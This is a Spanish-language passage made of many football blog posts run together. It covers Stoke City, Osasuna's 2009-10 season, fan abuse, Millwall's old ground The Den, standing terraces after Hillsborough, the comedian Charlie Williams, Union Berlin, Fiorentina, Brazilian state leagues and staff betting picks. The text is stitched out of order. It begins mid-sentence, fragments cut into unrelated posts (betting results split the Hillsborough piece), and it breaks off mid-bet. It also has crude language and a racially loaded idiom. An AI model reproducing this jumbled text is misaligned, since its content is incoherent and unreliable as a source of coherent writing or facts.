dos temporadas en el banquilloPero mi historia favorita del Stoke es la que involucra a Mark Chamberlain. Chambo es para muchos potters el mejor jugador que haya vestido la rojiblanca tras Matthews. Esto es ley desde que dejara su marca como delantero especialmente fino (los que le vieron le pintaban como un modesto John Barnes) en el Stoke ochentero hasta el punto de ser requerido por Bobby Robson para unos cuantos partidos en la nacional. Mark Chamberlain llegó al Stoke City tras maravillar en el Port Vale, eterno rival, y a su llegada un periodista le preguntó si el cambiar de acera le había traído algún tipo de problemas con sus amigos. “Realmente no. Eso no podría ser porque en realidad no tengo ningún amigo” contestó Chambo sin pestañear e ignorando que acababa de convertirse en icono indeleble. Historias del Stoke, dentro de un mes les cuento otra. Con el inevitable esfuerzo que requiere nadar en lo pantanaso pero sin apurones de última hora certificó Osasuna la salvación. Un año más, jugará en Primera División. En la antepenúltima cita y frente a esas hermanas de la caridad a rayas blanquiazules que han sido los jugadores del Deportivo de la Coruña durante casi toda la segunda vuelta, es cierto, pero goleando en casa (3-1) y con cierta suficiencia. Los de El Sadar, que el lector me disculpe la disidencia con lo mercantil, llevaban dos temporadas consecutivas salvando los muebles en la última jornada así pues, no sería injusto calificar la 2009-2010 como exitosa en toda regla. José Antonio Camacho, la plantilla al completo y media Liga habría firmado, con los ojos cerrados al comienzo del ciclo, un final como el de los rojillos.Alejado de los puestos de descenso, verdadero objetivo, durante todo el curso, es cierto que Osasuna pudo aspirar a algo más durante el campeonato. El propio Camacho ha reconocido en alguna ocasión que el equipo bordeó, estuvo en el mismo umbral, de engancharse a la zona con premio pero la falta de acierto en el gol, principalmente, y la irregularidad manifiesta en su juego, han privado a los navarros de mayores glorias. Echar un vistazo a aquellos sabrosos doce puntos que los rojillos supieron embolsarse a caballo entre enero y febrero es entender la queja.En cualquier caso, la sensación de “todo vale” en los estadios nos ofrece semanalmente imágenes de personas deformadas por el grito, de increpaciones al árbitro o a los jugadores contrarios, de lemas desafortunados y censurables, de episodios de vergüenza ajena con aficionados excesivos, desencajados.Vivir apasionadamente este deporte es parte del espectáculo. Llorar o gritar no está reñido con la mesura. El insulto no puede ser la moneda de cambio entre las aficiones, por más rivalidad o encono que exista, por más vendettas políticas que pretendan cobrarse. No defiendo un fútbol aséptico, blando, pero sí ciertos límites para vivir los colores como algo más que una expresión furibunda del hastío vital. No ir al campo a exorcizar los temores y dramas domésticos, como hace nada defendía un contertulio, cuyo nombre de verdad no recuerdo, en la enésima perorata radiofónica.Hay muchos paños calientes sobre este tema. Primero se culpa a unos pocos energúmenos, dejando inmaculado el nombre de la afición. Pero ni diez, ni quince, ni veinte pueden hacerse oír en un estadio abarrotado. Son fenómenos extendidos, palpables en cualquier campo. Hoy se habla del Atleti pero mañana podría subtitularse el griterío de cualquier otro estadio con similares resultados. También esta misma mañana en las insalubres tertulias se hablaba de la provocación previa, como si el dedo de Mourinho, las carreras de Emery o la efusividad al celebrar un gol fueran el detonante de una constante e inmisericorde cantinela de insultos. La falta de adecuación de las aficiones, sus celebraciones incendiadas y nocivas, son un fenómeno popularizado y abordado siempre con una laxitud pasmosa, con miedo a herir a esa otra gente que acude tímidamente a los estadios.Imágenes de niños, muy recientes, insultando al portero contrario pueden ser un síntoma del ambiente de crispación constante del aficionado. No me tengo por un adalid de la educación, pero me sorprende ver en el fútbol actitudes que no pueden verse en ningún otro ámbito de la vida pública. Es cómico imaginarse mostrar semejante virulencia en un teatro ante una obra mal representada, al final de una película en el cine si no ha sido de nuestro agrado o en la cola de un banco cuando vemos que nos han vuelto a cobrar una comisión fantasma de las suyas.En el fútbol, y no hablo del fútbol profesional, también en categorías inferiores, juveniles, hasta equipos de barrio, se ha instalado la permisividad de la salvajada, el insulto, la violenta respuesta a los hechos sobre el césped, cuyas consecuencias llevamos viendo años. Ahora son los cánticos los que ocupan algunos minutos en los noticieros, una buena oportunidad de empezar a apercibir a los clubes, de intentar apaciguar un fenómeno molesto, de acabar con esas pequeñas cosas que oscurecen y obligan a aborrecer un deporte de unión, de responsabilizar a los equipos de una afición que en ocasiones hace sangre del dolor ajeno para elevar sus propios colores. Todo muere menos el fútbol. Se van los amigos con sus bufandas a otra parte. Desaparecen los abuelos y los padres que nos acompañaban al partido. Se mudan lejos los hermanos con los que dábamos patadas al balón sobre el cemento triste de las ciudades. Se van las parejas que compartían espacio a regañadientes frente a la televisión. Muere la pasión, muere hasta el entusiasmo, mutamos como forofos, nos reblandecemos, hasta despreciamos este deporte bárbaro que una vez lo fue todo. Somos pacientes pero no idiotas. Renunciamos cuando las derrotas se encadenan, se eternizan una tras otra, cuando los equipos se hunden en la brea, cuando descubrimos categorías cloacales bajo nosotros y olvidamos lo que sucede sobre el universo verde de los campos. Damos la espalda a lo que fue nuestro. Pero en otro plano, a nuestras espaldas, el fútbol sigue impasible, esperando que de nuevo retomemos el gusto por el balón y los colores, como un hijo de puta paciente que sabe que caeremos de nuevo en sus caprichosas zarpas. Tranquilo, a sabiendas de que todo es un enfado temporal, un apretar de puños que dura lo que un pestañeo, una cinta de nubes que nos cubre la frente durante semanas, tal vez meses. Todo se acaba menos el fútbol, todo es mudable menos el fútbol.De la mano de Classic Football Shirts , la tienda especializada en camisetas antiguas, nos acercamos al  fútbol con una perspectiva diferente, desde los uniformes con los que se  ha construído la historia del deporte rey.Hay camisetas que son prisioneras de esa guerra. Escondidas en los altillos, amordazadas con bolsas del Carrefour en alguna maleta desconchada, alimentadas con alcanfor y frío. Son muchos los tejidos que nos sugieren el desierto de los palcos y el desfile siniestro por los vomitorios. Comprarlas ahora, de segunda mano, es hurgar en la herida. Pero somos tan modernos que últimamente hasta celebramos lo que nos dolió. Igual que cuando bebemos cantamos canciones de Shakira o los indies reivindican lo que una vez nos resultó hortera, ahora todos tenemos cierto cariño a los perdedores, a lo nefasto. Hablar de Spasic, con lo que sufrimos ese gol torturado, o recordar el codazo de Tassotti como una muesca corajuda en nuestras vidas y no como un episodio amargo de nuestra existencia. La victoria nos insensibiliza, la derrota nos emociona. Ganar es una exigencia vacía, perder es una liturgia compartida. Abrazarse con el resultado en contra es amor, abrazarse cuando nuestro equipo marca es cinismo. Como la exaltación de la amistad en las noches etílicas, falso como el cumplido pésame a un desconocido. Nunca me cansaré de reivindicar la decepción por encima de la alegría. Como un cristianismo balompédico, como un peculiar valle de lágrimas con áreas y porterías. Soy así de vulgar. Será el frío de diciembre, será que voy preparándome el cuerpo para una derrota contra el Barça en casa, será que la Selección ya no maravilla, será que los perdedores han llenado más páginas que los héroes en mis novelas preferidas.Puedes comprar estas camisetas y cientos más en Classic Football Shirts. El madridismo está en crisis, como sentimiento. Es difícil elevar nuestro cariño tras situaciones como la de anoche, tras espectáculos vulgares como los protagonizados por Mourinho, Marcelo o Pepe. Es difícil posicionarse, discernir entre el fragor del partido y el simple macarrismo.Atender al escaso complemento que le han brindado al siempre letal (rifle por algo)  Pandiani, especialmente un decepcionante Aranda, es comenzar a vislumbrar el problema.Es tiempo de reflexión en Pamplona. El presidente Patxi Izco, que cumplirá la temporada que viene su tercer y último mandato al frente del club, ha dado el primer paso apretando las manos con José Antonio Camacho. El murciano, fiel a su convencimiento de que sólo hay que estampar tu firma cuando ha cumplido objetivos, seguirá en el banquillo de El Sadar el próximo año. Pese a la desconfianza, absurda, pueril y claramente sectaria, de cierto sector de aficionados, Camacho ha de ser el eje sobre el que se construya el próximo Osasuna. Mantener lo bueno (una gran defensa y el incombustible Pandiani son ejemplo de ello) y reforzar portería y centro del campo (ya han llegado Asier Riesgo, Soriano y se está cociendo la guinda de Fran Yeste) han de ser prioridades para el nuevo ciclo. Será el décimoprimer proyecto consecutivo de Osasuna en Primera. Ahí es nada.Lo mejor: La labor de Camacho. La consolidación de una gran defensa y los goles de Walter Pandiani.Lo peor: Irregularidad y escaso poder ofensivo: suficiente para éste año pero a mejorar, claramente, para no pasar apuros en lo sucesivo. Para conmemorar la vuelta al Championship de uno de los clubes con más sabor de Inglaterra, el Millwall, nos damos un paseo por el que una vez fuera su campo, por The Den.Si eres del Millwall tienes que rendirte a la imaginería que rodea al equipo. Fundado en 1885 por obreros escoceses el Millwall vino al mundo en un lugar concreto en los suburbios del puerto londinense: el sur de la Isla de los Perros. Como más tarde se demostraría, el nombre que figuraba en su partida de  nacimiento, era premonitorio. Los dos primeros campos en los que se desempeñó el equipo del puerto eran lamentables pero el tercero, acondicionado frente a los muelles de Millwall, se llevaba la palma. Un jugador del seminal Corinthian declaró antes de disputar un encuentro allí que no le importaba hacerlo en absoluto, siempre y cuando a nadie se le ocurriese tirarlo al suelo porque iba a tardar semanas en desprenderse del asqueroso olor que emanaba del cesped. El sitio era tan bueno para jugar al fútbol que terminó siendo un almacén de maderas y más tarde fue derruido. En 1910, el Millwall, conocidos entonces como Los Leones tras una impresionante racha de matagigantes en la Copa de 1900, encontró su nidito de amor definitivo en New Cross. El campo, bautizado como The Den, la guarida, se alzaba junto a Cold Blow Lane y ahí, en el callejón del viento frío se quedaron hasta 1993. Dice Simon Inglis, en su imprescindible guía sobre los campos de Inglaterra, que paseando por Cold Blow Lane de camino el Den, en una noche húmeda, uno se arriesgaba a toparse con Jack El Destripador. Hielo flotando sobre el empedrado de la callejuela, callejones llenos de chatarra, los sucios bloques de pisos en el horizonte y los railes del tranvía incrustados en la carretera.El que bautizó el lugar sabía lo que se traía entre manos. El otro modo de llegar, a través de un aparcamiento sin asfaltar y las vías de tren abandonadas para avistar al fín, el Den enterrado entre las vías de tren y un enjambre de callejuelas, no era mucho mejor. Se entiende que nadia, ni los hinchas visitantes ni los equipos rivales salvo los propios jugadores del Millwall, sintiese el mayor interés en aparecer por la zona.Había muchos factores, aparte de albergar a algunos de los hooligangs más violentos del país, que hacian del viaje al Den un mal plan de sábado para el hincha visitante. Para empezar era justo el lugar con peores vistas del terreno de juego el reservado para los aficionados visitantes. Como no había sitio fuera del campo, las torres de iluminación se construyeron en las mismas gradas y uno se tenía que resignar a espiar el fútbol frente a una enorme pared de hormigón con un león pintado, confinado en una esquina y de paso sortear con la mirada la valla de metal de dos metros de altura, coronada al punzante modo, que las normas de seguridad obligaban a instalar a todos los clubes. ¿Delicioso o no?Pero la cosa no mejoraba en el resto del campo. Los dos fondos eran dos gradas de cemento idénticas en los que un tejadillo apenas cubría un par de filas. Y a estas alturas ya sabrán que en Londres llueve, y mucho. A la izquierda estaba Ilderton Road End, separada por vallas del resto de la Tribuna Principal. A donde quiera que se atendiese se podía leer un cartel prohibiendo el lanzamiento de objetos al campo. A un lado y a otro, la Tribuna Principal (pese a estar plagada de molestos pilares para sujetar el tejado de acero) y la Tribuna Norte (lugar reservado al marcador y al puesto, chamizo más bien, de policia) eran las zonas nobles de la ratonera. Bañen todo esto una luz tenue, proporcionada por un sistema de iluminación insuficiente y podrán hacerse una idea de aquel campo.En 1993 los nuevos tiempos impusieron el traslado a un campo nuevo, al que los locales se han acostumbrado con la misma velocidad que los hinchas visitantes han comenzado a odiarlo, cerca del antiguo emplazamiento y las cosas han mejorado notablemente. En la memoria de quienes lo pisaron queda un recinto estrecho y gris dominado por la degradación de sus tejados y las gradas destartaladas. Quiza debido a que los accesos al estadio eran tan retorcidos, uno podría pensar que aquello era una isla de orden en un mar de confusión, pero las vallas afiladas, el chamizo de la policía, ni un atisbo de comodidades y las tribunas en penumbra le daban al conjunto el aspecto de una trampa enorme. No  es de extrañar que Millwall estableciera allí el aplastante récord de 59 partidos de Liga  consecutivos sin conocer la derrota. “Si se hace como en algunos estadios alemanes y se controla bien el aforo, es una buena idea”, “siempre y cuando bajen el precio de la entrada, no me parece mala idea” o “¿Qué quieren? ¿Otro Hillsborough? son algunas de las opiniones que he recogido en apenas media hora cuando he trasladado a nuestros seguidores en twitter el debate que ahora mismo tienen los ingleses entre manos. Volver a tener gradas sin asientos en los campos de fútbol de primera y segunda división ¿Sí o no? . Amplificad el runrún de nuestra pequeña cuenta a toda la nación futbolística (lo que ocurra en la Premier se replicará en el resto de Europa casi con total seguridad) y entenderéis la importancia del asunto. Si os parece me gustaría que continuásemos con el debate que arrancó en twitter en el hilo de este post.Pero antes de discutir es necesario volver la vista al espectáculo enfermo que fue Hillsborough.Los grandes beneficiados de la jornada fueron Pol y Ramón, con una táctica algo más conservadora pero más segura, ambos cerraron en positivo sus dos apuestas, gracias a las victorias de Chelsea y United. Sigue confirmándose que apostar en competición europea nos parece más complejo que hacerlo en las competiciones domésticas.Las apuestas de Borja Barba1) Real Madrid-Schalke 04. Gana Real Madrid con hándicap 0-2. PERDIDA2) Manchester United-Olympiakos. Se clasifica el Manchester United. Cuota 2.60. Stake 4 GANADAUn tonto autogol del Madrid me impidió volver a hacer pleno de apuestas en una jornada en la que intenté no exponerme demasiado a posibles pérdidas.Para la J7, vuelven las competiciones domésticas, y esta vez voy a apostar por una tirada conservadora pero de cuota elevada. Una súper combinada.Athletic-Getafe. Pese a no contar con Aduriz, sancionado, el Athletic debe ganar al Getafe de Contra para seguir en esa posición cómoda con respecto a Real y Villarreal en su lucha por puestos de Champions. Su victoria se paga considerablemente bien, a 1.36.Betis-Atlético. Tras el agotador derbi europeo, prórroga incluida, al Betis le va a costar afrontar su partido frente al Atleti. Victoria colchonera pagada a 1.55.Schalke-Braunschweig. Tras el varapalo de los octavos de final, la gran meta de este Schalke es colarse como subcampeón de la Bundesliga. Tiene al Borussia solo a un punto, y el partido ante el débil Braunschweig parece ocasión propicia para seguir sumando y lavarse las heridas europeas. Victoria del Schalke se paga a 1.40.Aberdeen-Kilmarnock. El Aberdeen es el gran candidato al subcampeonato escocés por detrás del intratable Celtic. Necesita ganar al débil Killie para poder distanciarse del Motherwell, tercero en la tabla empatado a puntos con los Dons. Victoria del Aberdeen a 1.50.Benfica-Académica Coimbra. Este Benfica camina firme, tanto en Europa como en Portugal. Sólo ha cedido dos empates en once partidos en casa, y no parece que la Académica, situada en media tabla, vaya a ser un rival complicado. Victoria benfiquista a 1.18.Newcastle-Crystal Palace. Huele bien esa victoria local frente a un Palace que anda con la soga al cuello. Victoria del Newcastle a 1.91.1) Combinada. Gana Athletic, gana Atlético, gana Schalke, gana Aberdeen, gana Benfica y gana Newcastle. Cuota total 9.90. Stake 4Las apuestas de Sergio Cortina1) Combinada (Chelsea-Galatasaray, gana el Chelsea; Real Madrid-Schalke, el Madrid gana los dos tiempos) Cuota final 2.92. Stake 10 PERDIDA2) Manchester United-Olympiakos. Gana el Manchester United. Cuota 1.45. Stake 5 GANADA¿Qué genio de las apuestas puede palmar pasta en un Real Madrid-Schalke?Los 96 hinchas del Liverpool que se quedaron en el camino colmaron el vaso en Inglaterra y motivaron a las autoridades competentes para elaborar las leyes que modificarían radicalmente el paisaje en los campos europeos. 31 días más tarde de la desgracia Peter Taylor, jurista y más tarde responsable máximo de la justicia en Inglaterra y Gales, presentó el documento que preparaba el cambio para que las desgraciadamente brutales por definición terraces británicas dejaran paso a los asientos y con ello a una nueva cultura de fútbol.Ya les anticipo que yo c0mulgo con las ideas de Malcom Clarke, presidente de la Football Supporters’ Federation. La FSF pide a los organismos que rigen el fútbol británico un cambio en la norma vigente para que los campos de fútbol vuelvan a tener zonas sin asientos y mira a Alemania para sustentar su proyecto. La Bundesliga votó en 1993 en contra de los estadios completamente de asiento y desde entonces trabaja eficientemente para hacer del cemento una zona segura. ¿El resultado? Goza de los precios más populares de las grandes ligas (por 14 euros puedes ver al Dortmund) y el mejor ambiente en los campos sin perder ni un ápice de seguridad. Dice la FSF que Inglaterra puede replicar un modelo similar en la Premier y que tan solo hay que echarle un vistazo a la Green Guide, el libro de estilo que rige las gradas de su infrafútbol. Precios asequibles, el ambiente de antaño y misma seguridad.Al otro lado de la calle, la FA, la Premier League y la policía se oponen al cambio. Argumentan que la cultura de fútbol en las gradas inglesas ha cambiado en los últimos 20 años para dejar paso a nuevos clientes, familias enteras y jóvenes, que dejarían de pagar religiosamente su abono si volviera un escenario similar al anterior. Ponen Glasgow, Millwall, Heysel o Hillsborough en el tapete, reclaman a la FSF garantías de que los enormes avances en seguridad alcanzados durante estas décadas no se vayan a ver lesionados y avisan del elevado coste que supondría para los clubes remozar sus campos. Olvidan, claro, que son precisamente esos avances en seguridad y la experiencia adquirida los que ha hecho triunfar el modelo de estadio mixto en la Bundesliga y que también es responsabilidad suya trabajar por estadios aun mejores.Evidentemente cualquier cambio tomará años pero al menos el debate está encima de la mesa. ¿Son posibles las gradas de pie en el fútbol actual? ¿Qué pensáis vosotros al respecto? Anoche me salté la dieta ampliamente y así estamos ahora, rumiando gilipolleces que no llevan a ninguna parte. No sé si me sentó peor la goleada o las pizzas que mi amigo Dani sazona como si no hubiera un mañana pero me he levantado sudando y con tres imágenes en la cabeza emitiendo en modo ‘bullet time’ Las piedrecitas de sal chocando dramáticamente sobre el italianísimo manjar, Iker, Ramos y Piqué alborotados como tres Sims necios mientras las llamas devoran su cocina y Astrud explicando que el vertedero de Sao Paulo no es una metáfora. Esta última me ha provocado el latigazo en el estómago y la visita al excusado. ¿Cuatro copias de la biblia catalana interconfesional, fotos pringosas de Natalia de Operación Triunfo y la campeona del Mundo enterradas en basura? No me jodas…Con el zumo de naranja me he puesto optimista y me ha dado por pensar que la gente se muere de pena. Que ocurre, ojo, que tampoco es una metáfora y se han hecho estudios muy costosos sobre el tema. Acuérdate de la abuela del segundo, la que se ocupaba con todo el cariño del mundo de ti cuando tu madre no podía pagar una guardería ni acabar una frase con los términos conciliación familiar sin que alguien la cortase a carcajadas. Falleció su marido y tres años más tarde enfiló ella el mismo camino entre melancolías. Espera, ¿no dijo Del Bosque que nos habíamos deprimido tras el 1-2? Otro latigazo, otra visita al baño.Ya en la ducha, pienso que es muy de la crónica negra española la mezcla brutal de drama y poesía. Que tendemos a exagerarlo todo cuando vienen mal dadas. Recuerdo también que anoche trasnoché viendo fútbol, un poco por ver al ogro chileno que nos iba a preparar la maleta de vuelta y un poco por darle tregua al estómago antes de caer rendido mientras ordenaba ocurrencias intestinales para escribir este texto. Veo que a las dos menos cuarto grité envalentonado en Twitter que los parabólicos nos habían colado un buen cebo con lo de Chile. Y el caso es que ordenar estás pajas mentales me ha animado y le he echado un vistazo a la convocatoria y a la primera parte del desastre y a la estrella.Ahora hace sol en Madrid y me voy a la calle. Sorbo sal de frutas con sabor a naranja (genio), sé que el vertedero de Sao Paulo no es una metáfora y confío en que el de Salvador de Bahía sí. Y ahora, algo completamente diferente: el futbolista comediante.Vuelco los cromos de culto sobre la mesa y los revuelvo. Entonces, solapándose unos con otros, asociándose como jamás lo harían en un campo, se me juntan el juerguista, el chupón, el negro, el que murió trágicamente, el homosexual, la maquina de enchufar goles, el bigotudo, el de cristal y uno raro que destaca sobre el resto. Es Charlie Williams, de los primeros futbolistas negros en ganarse el pan en Inglaterra pero sobre todo el único de la historia en triunfar después como cómico de éxito. Pero eh, no como Julito Salinas o el Lobo Carrasco, Williams era un profesional del humor de pies a cabeza. Así, uno de los primeros humoristas negros que vio la tele inglesa fue un futbolista.A Charlie Williams, que nació cerquita de la mina en Barnsley, el negro no le venía del hollín sino del adn paterno, un barbadeño que se había buscado la vida en  Inglaterra alistándose en el ejército. Minero a los 14 lo primero relevante que hizo Charlie en su vida fue labrar una consistente carrera como central en el Doncaster Rovers. Durante once años corrió como un negro para sobrevivir como un blanco. Pateo la pelotita al cielo, se jugó los dientes, saltó, metió, estrujo las medias cargadas de barro y todas estas cosas a las que suelen dedicar su vida los defensas de segunda y tercera división. Hasta que le llegó el retiro y entonces ¿qué hizo Charlie?Un futbolista puede ganarse la vida como entrenador, como comentarista deportivo (esta es buena porque no hace falta saber expresarse) o comerciando con las carreras de los que en su día fueron sus compañeros de profesión. A unas malas puede hasta vivir de las rentas. No faltan opciones pero Williams tenía otros planes. El tipo sabía de su raro talento y se dedicó a peinar los baretos de Yorkshire buscando trabajo en el showbusiness. Como se daba cierta maña con los gorgoritos probó de cantante hasta que comprobó que sus discursos ácidos entre coplas volvían loco al personal. Cambio el registro del micro y acabó dedicando su vida a la comedia.Charlie lo buscó con ahinco en los garitos de media Inglaterra. Tanto que finalmente acabó convirtiéndose en cara familiar para las familias inglesas desde su atalaya en “The Comedians”, un programa de humoristas amateurs de stand-up que gozó de los favores del respetable a principios de los 70. Entre inglesazos cascándose chistes gruesos sobre pakis y sexo aparecía un negro de Barnsley amenazándoles con mudarse al lado de sus casas si no se portaban bien. Esta era una de sus bromas recurrentes. Otra era dar las gracias a dios porque aquel día no le habían deportado.Todo esto en pleno auge del Frente Nacional. Antes de que el ska y el reagge jamaicanos asomaran por la radio británica hubo un negro que fue la bomba. Se llamaba Charlie Williams y por lo que contaba y como lo contaba nunca hubieras dicho que había sido futbolista. Algún día os explicaremos el nuevo método de organización interna que hemos adoptado en DDF. Solo anticipo que lo hemos bautizado como Método Gustems y que funcionaría aun mejor si tipos como yo cumpliesen debidamente con el cuadrante. Así que a la carrera, ahí va hoy lo que debería haber ido el lunes…Unos que son infinitamente menos vagos que yo son los hinchas del Union Berlin. En Köpenick, un suburbio al sureste de Berlín, nunca se le han caído los anillos a nadie por aparcar la legaña camino de un duro día de pesca o de trabajo robótico en la acería. Tampoco cuando ha tocado arrimar el hombro para ayudar al equipo local, el Union Berlin. En 2008 (lo conté aquí en su día) la hinchada obrera del Union acarreó piedra podrida, acondicionó las gradas y limpió a conciencia su decrépito estadio para conseguir la adecuación a los reglamentos de la federación alemana. Anteriormente había donado incluso su propia sangre para rescatar al club. Estaban en tercera división, hoy en segunda el “An der Alten Försterei” necesita una grada y la parroquia echará de nuevo un cable.La nueva tribuna cuesta unos quince millones de euros y resulta que va a ser financia mediante la venta del 58% de acciones del estadio. Las comprarán los aficionados que además de ayudar a modernizar su propia casa servirán de contrapeso a futuras acciones comerciales que pudieran chocar con la esencia y espíritu del club. Por ejemplo la temida prostitución comercial del nombre del campo.“Vamos a vender nuestra alma pero a los miembros de nuestro club”, declaró el otro día Dirk Zingler, que además que haber sido bautizado con nombre y apellido propios del más vigoroso de los actores porno es el presidente del Union que pasará a la historia por haber devuelto su casa a la gente. Por haberles invitado a entrar.Y sí, odio eterno al fútbol moderno. No se me ocurre nada mejor para terminar. Paulo Sousa tirando monedas al aire mientras silba ‘Changes’ de Bowie. No funcionaron las rotaciones, pero en el regreso a los cromos conocidos, frente al Udinese, la Fiorentina arrolló (3-0) y sigue en la pomada de la Serie A. Tiene mérito lo del portugués: no es sencillo plantarte en la fiesta con dos regalos en cada brazo y que ninguno se te resbale y acabe hecho mierda en el suelo. Sousa aterrizó en Florencia siendo un amarrete en los banquillos y además juventino. O eso sentenciaba una hinchada acostumbrada a pelear por poco más que el orgullo provincial pero eso sí, con equipos de corte elegante a la Prandelli o a la Montella. Pocos meses después todos son abrazos para Sousa. La Fiorentina vence y convence. No está mal para una ciudad capaz de mandar al exilio a Dante Alighieri. O de gritarle con desdén zapatero a Diego Della Valle, el dueño de la Tod’s, una de las marcas de zapatos más lujosas de Italia, que salvó el club hace una década.La Fiorentina sigue conmoviendo, digamos que ahora lo hace con la frecuencia industrial que siempre han envidiado de los turineses. Más verticalidad y más mordiente, de animal de costumbres ha evolucionado en cazador con capacidad de matar en varios escenarios. La posesión y el pase están ahora para defender resultados, pero la comodidad la encuentran siempre en las carreras más directas al gol. Salvando las distancias, el equipo puede mirarle a la cara al PSG y el Barcelona, en términos de posesión de balón pero la querencia tocona no deriva en zetas, corderitos y sierras. La aparición de Bernardeschi en la transmisión y de Kalinic en el remate han avivado la vocación ofensiva de un equipo que ya contaba con Borja Valero o Josip Ilicic.Si la Fiorentina siempre se ha dejado arrastrar por cierto espíritu volátil, la versión Sousa de lo viola es justo la contraria.Luego se juega una especie de segunda vuelta, en la cual cada equipo se enfrenta a los ocho del otro grupo de la primera vuelta. De nuevo semifinales y final, y el que gane se proclama campeón de la Copa de Río. Como volvió a ganar el Fla (penaltis a Vasco tras 0-0), no hubo lugar a la final del Carioca, que teóricamente debían disputar los triunfadores de cada torneo. Aparte, se disputan dos mini-torneos más: el trofeo Washington Rodrigues, entre los terceros y cuartos de la liguilla de la Copa Guanabara, y el trofeo Carlos Alberto Torres –el del gol de la final del 70- entre terceros y cuartos de la correspondiente Liga de la Copa Rio. Finalmente, el campeonato da derecho a una plaza para la serie D nacional, que correspondió al Boavista, cuarto en el cómputo global.El campeonato paulista (o Paulistao a secas) agrupa a todos los equipos radicados en el estado de Sao Paulo, lo cual significa que además del conjunto de la capital, juegan sus competiciones clubes tan históricos como Corinthians, Portuguesa o Santos. Consta de cuatro divisiones, llamadas respectivamente Serie A1, Serie A2, Serie A3 y Serie B (también conocida como Quarta Divisao). La que más nos interesa aquí, la serie A1, la disputan veinte equipos a una sola vuelta, de los cuales los ocho primeros se juegan el campeonato, con cuartos de final y semifinales a un solo partido y la final a doble. Este año la final ha sido un apasionante Santos-Corinthians, que se ha llevado el equipo de Pelé. La peculiaridad es que aparte de los mencionados, se disputa otro torneo, el Campeao do Interior, que juegan los equipos mejor clasificados a partir del quinto inclusive, sujetos a la siguiente condición: no pueden jugar este torneo –reservado por tanto al fútbol modesto- ni el Santos, ni la Portuguesa, ni ningún equipo de Sao Paulo. El honor fue hace unas semanas para el Oeste de Itápolis, que tumbó en la final al Ponte Preta. Es también destacable que el Campeonato Paulista da derecho a jugar la serie D del campeonato nacional a los dos mejores clasificados que no estén ya en alguna de las tres divisiones superiores. Así es este mundo, un laberinto de competiciones con sistemas a menudo extraños, y cuyo conocimiento global entraña un esfuerzo titánico. No profundizaremos mucho más, pero sí se puede destacar que el único nexo entre los campeonatos locales y el nacional se da a través de la serie D, que se renueva fuertemente cada año a través de equipos que consiguen una buena clasificación en el estadual -tal como hemos visto en el Carioca y el Paulistao-; de hecho, en los dos últimos campeonatos disputados sólo 14 de los 40 equipos han repetido. Los campeonatos estaduales también son puerta de entrada a la Copa Brasileña, la cual a su vez -como debería hacerse en España-garantiza a su campeón acceso a la Libertadores; la curiosidad es que la disputa de la Libertadores es incompatible con la de la Copa, lo cual convierte a esta competición en el paraíso de los clubes de nivel medio. Por supuesto, los otros cuatro accesos a Libertadores son par a los cuatro primeros del campeonato nacional, auténtico premio de la temporada. De la gran competición de clubes por excelencia de Sudamérica hablaremos otro día. Puede ser quizá la acción más brutal nunca contemplada en los mundiales. En Sevilla, semifinales del mundial 82, campa el 1-1 en el marcador cuando el zaguero francés Battiston acude raudo a recibir el balón en profundidad, y el guardameta Schumacher sale como un resorte a disputar la pelota. Battiston sólo puede rozar levemente la bola antes de que el portero teutón, que llega a toda velocidad, salte con todas sus fuerzas e impacte su cadera, en un choque brutal, contra la cabeza del atacante. Ni el árbitro Corver ni su linier señalan nada, mientras la víctima yace en el suelo sin sentido –al final perdería dientes y aún hoy no recuerda el incidente-, sus compañeros aparecen desquiciados temiendo lo peor, y el portero, con una frialdad estremecedora, espera tranquilamente junto al balón a que se despeje el área. Siempre ha negado que su acción fuera voluntaria pero, francamente, es difícil creerle después de ver una imagen que es imposible de olvidar. Uno de esos récords venerables que permanecen insuperados en la historia de los Mundiales es el logrado en el mundial de Suecia por el atacante francés Just Fontaine, que anotó 13 goles en seis partidos, incluyendo un memorable póker frente a Alemania en el partido por el tercer puesto. Fontaine era un ariete clásico maestro del desmarque y preciso en la definición, que necesitó el clásico golpe de suerte –en forma de lesión del delantero titular, René Bliard– para ganarse su puesto en los libros y la hemerotecas. La vida se lo cobró poco después, en forma de una grave fractura que acabaría retirándolo del fútbol, y que empequeñeció una carrera que pudo llegar a ser gloriosa. En cualquier caso, será difícil que su marca sea batida alguna vez. República Checa. Cuartos de final. Dos victorias y dos derrotas; cinco goles marcados y seis encajados. Goleadores: Jiracek (2) y Pilar (2). Lo mejor. la capacidad para reponerse después del varapalo frente a Rusia en el primer partido, la seriedad defensiva y la capacidad de Bilek de sacar rendimiento de un plantel huérfano de estrellas.Lo peor. Lo mal que entraron en el torneo, la escasez de alternativas en ataque, el deficiente rendimiento de un Milan Baros que hace tiempo está en la cuesta debajo de su carrera, y la comparación con versiones relativamente recientes del mismo equipo.La estrella. Aunque ha causado sensación el lateral Gebreselassie, hay que quedarse con el joven Václav Pilar, quizá el único argumento serio en ataque que ha ofrecido el combinado centroeuropeo. Móvil, eléctrico y muy vertical, lo veremos en el Wolfsburgo la próxima temporada. Ojalá confirme lo que ha prometido aquí.El momento. Probablemente el gol de Jiracek a Polonia, que silenciaba a todos un país y garantizaba el pasaporte para cuartos y la satisfacción del trabajo bien hecho.Grecia.Ese soy yo y así me luce el pelo: tercero de cuatro en esta noble competición dedefista… Intentaré enderezar con algo que se supone sencillo y algo con cierta salsa. Apuesto ocho euros que el Manchester Cty gana al descanso y al final frente al Fulham y otros 10 a que al over 2.5 goles en el Clásico. Ambas simples porque las combinadas me están dejando seco.1) Manchester City-Fulham (el City gana los dos tiempos) Cuota 1.91 Stake=82) Real Madrid -Barcelona (Más de 2.5 goles) Cuota 1.57 Stake=10Las apuestas de Pol Gustems1) Manchester United – Olympiakos (Se clasifica el United a 2.60) = Cuota final 2.60. Stake 5 GANADA2) Combinada Manchester United – Olympiakos y Chelsea – Galatasaray (Ganan United a 1.45 y Chelsea a 1.36) = Cuota final 1.97. Stake 5 GANADABueno, por fin acertamos algo. Y tenemos a Cortina a tiro, así que vamos a por él. Creemos en el Chelsea de Mourinho en el duelo estrella de la Premier League. Sin arriesgar mucho vamos con dos cuotas interesantes, la primera que gana sin encajar un gol y la segunda que el belga Eden Hazard, seguramente el futbolista más en forma de la competición, marca un gol. Suele tirar los penaltis y la defensa del Arsenal tiene bastante tendencia a ceder penas máximas en contra. Por último, nos fiamos del golpe de efecto del United en Champions. La cuota es muy buena aunque sea fuera de casa. No estará Van Persie pero vuelve Mata.1) Chelsea – Arsenal. Gana Chelsea sin recibir ningún gol. Cuota 2.90 = Stake 5.2) Chelsea – Arsenal. 